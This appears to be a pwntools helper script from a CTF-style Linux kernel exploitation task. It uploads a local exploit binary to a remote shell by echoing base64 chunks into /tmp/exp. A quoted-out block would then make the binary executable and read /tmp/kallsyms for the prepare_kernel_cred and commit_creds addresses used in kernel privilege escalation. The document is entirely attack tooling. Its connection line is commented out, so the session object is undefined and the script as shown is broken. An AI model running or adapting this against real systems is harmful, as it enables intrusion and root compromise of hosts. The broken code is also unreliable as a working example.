from pwn import *
import base64

f = open('poc','rb')

#p = remote('39.107.14.241',9999)


p.recvuntil('$')

while 1:
    data = f.read(2048)
    if len(data) == 0:
        break
    d = base64.b64encode(data)
    p.sendline('echo ' + d + ' |base64 -d >> /tmp/exp')
    p.recvuntil('$')
    print 'send'

f.close()
'''
p.sendline('chmod +x /tmp/exp')

p.recvuntil('$')

p.interactive()
p.sendline('cat /tmp/kallsyms | grep prepare_kernel_cred')

prepare_kernel_cred_addr = p.recvuntil('T prepare_kernel_cred').replace('T prepare_kernel_cred','')
print prepare_kernel_cred_addr

p.recvuntil('$')
p.sendline('cat /tmp/kallsyms | grep commit_creds')
commit_creds_addr = p.recvuntil('T commit_creds').replace('T commit_creds','')

print commit_creds_addr

p.recvuntil('$')
p.sendline('cd /tmp')
p.recvuntil('$')
'''


